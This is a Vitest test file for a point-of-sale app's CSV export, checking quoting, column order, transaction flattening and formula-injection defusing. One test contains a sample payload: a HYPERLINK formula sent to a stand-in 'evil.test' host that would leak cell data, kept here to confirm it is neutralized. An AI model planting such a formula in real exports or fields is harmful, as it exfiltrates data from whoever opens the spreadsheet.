import { describe, it, expect } from 'vitest';
import { toCsv, transactionsToCsvRows, neutralizeFormula } from '../../src/lib/csv';
import { SaleTransaction } from '../../src/types';

describe('neutralizeFormula', () => {
  it('prefixes values a spreadsheet would execute as a formula', () => {
    for (const payload of ['=1+1', '+1', '-1', '@SUM(A1)', '\tx', '\rx']) {
      expect(neutralizeFormula(payload)).toBe(`'${payload}`);
    }
  });

  it('leaves ordinary values untouched', () => {
    for (const value of ['Latte', '3.50', '', 'a=b', 'Jo-Anne']) {
      expect(neutralizeFormula(value)).toBe(value);
    }
  });

  it('neutralizes a formula smuggled in through a product name', () => {
    // A product named to pull data out of whoever opens the export.
    const attack = '=HYPERLINK("http://evil.test?"&A1,"click")';
    const csv = toCsv([{ product: attack }]);
    // Quoted (it contains commas/quotes) with inner quotes doubled per RFC-4180,
    // and the leading = defused so the cell is read as text.
    expect(csv).toBe(`product\n"'${attack.replace(/"/g, '""')}"`);
    expect(csv.startsWith('product\n"\'=')).toBe(true);
  });
});

describe('toCsv', () => {
  it('emits a header and rows', () => {
    expect(toCsv([{ a: 1, b: 2 }])).toBe('a,b\n1,2');
  });
  it('quotes values with commas, quotes, or newlines', () => {
    expect(toCsv([{ a: 'x,y', b: 'he said "hi"', c: 'a\nb' }])).toBe(
      'a,b,c\n"x,y","he said ""hi""","a\nb"',
    );
  });
  it('honors an explicit column order and fills missing keys', () => {
    expect(toCsv([{ a: 1 }], ['b', 'a'])).toBe('b,a\n,1');
  });
  it('escapes and neutralizes dynamic headers', () => {
    expect(
      toCsv([{ 'Customer, Name': 'ok', '=Formula': 'safe' }], ['Customer, Name', '=Formula']),
    ).toBe('"Customer, Name",\'=Formula\nok,safe');
  });
  it('returns just the header for empty input with columns', () => {
    expect(toCsv([], ['a', 'b'])).toBe('a,b');
  });
});

describe('transactionsToCsvRows', () => {
  it('flattens a sale into a row with summed item count', () => {
    const tx: SaleTransaction = {
      id: 'TX-1',
      date: '2026-07-16T10:00:00.000Z',
      items: [
        { productId: 'a', productName: 'A', price: 2, cost: 1, quantity: 2, total: 4 },
        { productId: 'b', productName: 'B', price: 3, cost: 1, quantity: 1, total: 3 },
      ],
      subtotal: 7,
      discount: 0,
      discountType: 'none',
      discountValue: 0,
      tax: 0.7,
      total: 7.7,
      paymentMethod: 'card',
      customerId: null,
      customerName: 'Jo',
      operatorName: 'Sam',
      status: 'completed',
    };
    const [row] = transactionsToCsvRows([tx]);
    expect(row.items).toBe(3);
    expect(row.total).toBe('7.70');
    expect(row.customer).toBe('Jo');
    expect(row.operator).toBe('Sam');
  });
});
